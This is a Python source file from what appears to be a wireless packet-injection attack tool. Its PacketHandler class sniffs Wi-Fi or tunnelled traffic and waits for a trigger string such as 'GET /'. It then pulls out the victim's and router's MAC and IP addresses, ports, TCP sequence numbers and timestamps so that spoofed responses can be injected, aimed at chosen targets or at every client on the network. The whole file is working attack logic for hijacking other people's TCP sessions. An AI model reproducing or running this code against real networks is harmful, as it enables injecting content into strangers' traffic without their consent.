import socket
from lib.injector import Injector
from lib.victim import Victim
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.utils import wrpcap

class PacketHandler(object):
    """This class does all the heavy-lifting.

    It has an optional Victims parameter that is a
    List of instances of Victims for targeted mode.

    It can also be fed an instance of VictimParameters
    directly if working in broadcast mode and attacking all clients.
    """

    def __init__(self, *positional_parameters, **keyword_parameters):

        self.victims = keyword_parameters.get('victims')
        if self.victims is None:
            self.victims = []

        self.handler = keyword_parameters.get('handler')
        self.i = keyword_parameters.get('i')
        self.victim_parameters = keyword_parameters.get('victim_parameters')

        if self.i is None:
            print ('[ERROR] No injection interface selected')
            exit(1)

        if len(self.victims) == 0 and self.victim_parameters is None:
            print ('[ERROR] Please specify victim parameters or Victim List')
            exit(1)

        ## Argument handling
        args = keyword_parameters.get('Args')
        self.nic = args.mon

        ## Trigger setup
        if args.trigger is None:
            self.trigger = 'GET /'
        else:
            self.trigger = args.trigger

        self.newvictims = []
        self.injector = Injector(self.i, args)


    def proc_handler(self, packet, args):
        """Process handler responsible for the last mile of packet filtering
        Obtains packet specific information and stores it to memory
        """
        if packet.haslayer(IP) and packet.haslayer(TCP):

            ## Trigger check
            request = self.requestExtractor(packet)
            if self.trigger in request:

                ## airtun-ng
                if args.tun is True:
                    rtrmac = packet.getlayer(Ether).dst
                    vicmac = packet.getlayer(Ether).src
                    dstmac = None

                ## monitor mode
                if self.nic == 'mon':
                    if args.tun is False:
                        rtrmac = packet.getlayer(Dot11).addr1
                        vicmac = packet.getlayer(Dot11).addr2
                        dstmac = packet.getlayer(Dot11).addr3
                    else:
                        rtrmac = packet.getlayer(Ether).dst
                        vicmac = packet.getlayer(Ether).src
                        dstmac = None

                ## all
                vicip = packet.getlayer(IP).src
                svrip = packet.getlayer(IP).dst
                vicport = packet.getlayer(TCP).sport
                svrport = packet.getlayer(TCP).dport
                size = len(packet.getlayer(TCP).load)
                acknum = str(int(packet.getlayer(TCP).seq) + size)
                seqnum = packet.getlayer(TCP).ack
            else:
                return 0

            try:
                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
            except:
                TSVal = None
                TSecr = None

            # print(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, TSVal, TSecr)
            return (vicmac,
                    rtrmac,
                    dstmac,
                    vicip,
                    svrip,
                    vicport,
                    svrport,
                    acknum,
                    seqnum,
                    request,
                    TSVal,
                    TSecr)
        return None


    def proc_injection(self,
                       vicmac,
                       rtrmac,
                       dstmac,
                       vicip,
                       svrip,
                       vicport,
                       svrport,
                       acknum,
                       seqnum,
                       request,
                       TSVal,
                       TSecr,
                       args):
        """Process injection function using the PacketHandler.victims List.

        If it was set, to check if the packet belongs to any of the targets.
        If no victims List is set, meaning it's in broadcast mode, it checks
        for the victim in PacketHandler.newvictims and gets the injection for it,
        if there is one, and injects it via Injector.inject().


        Gutting some of the logic to concentrate on injection speed
        """
        ## Broadcast mode
        if len(self.victims) == 0:

            for victim in self.newvictims:
                injection = victim.victim_parameters.file_inject
                self.injector.inject(vicmac,
                                     rtrmac,
                                     dstmac,
                                     vicip,
                                     svrip,
                                     vicport,
                                     svrport,
                                     acknum,
                                     seqnum,
                                     injection,
                                     TSVal,
                                     TSecr)

        ## Targeted mode
        else:
            for victim in self.victims:
                injection = victim.victim_parameters.file_inject
                self.injector.inject(vicmac,
                                     rtrmac,
                                     dstmac,
                                     vicip,
                                     svrip,
                                     vicport,
                                     svrport,
                                     acknum,
                                     seqnum,
                                     injection,
                                     TSVal,
                                     TSecr)

    def process(self, interface, pkt, args):
        """Process packets coming from the sniffer"""
        try:
            vicmac,\
            rtrmac,\
            dstmac,\
            vicip,\
            svrip,\
            vicport,\
            svrport,\
            acknum,\
            seqnum,\
            request,\
            TSVal,\
            TSecr = self.proc_handler(pkt, args)

            ## Broadcast mode
            if not args.t:
                v1 = Victim(ip = vicip,
                            mac = vicmac,
                            victim_parameters = self.victim_parameters)
                self.newvictims.append(v1)
            self.proc_injection(vicmac,
                                rtrmac,
                                dstmac,
                                vicip,
                                svrip,
                                vicport,
                                svrport,
                                acknum,
                                seqnum,
                                request,
                                TSVal,
                                TSecr,
                                args)
        except:
            return


    def requestExtractor(self, pkt):
        """Extracts the payload for trigger processing"""
        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        if len(ret2.strip()) > 0:
            return ret2.replace("'", '').strip()
        else:
            return None
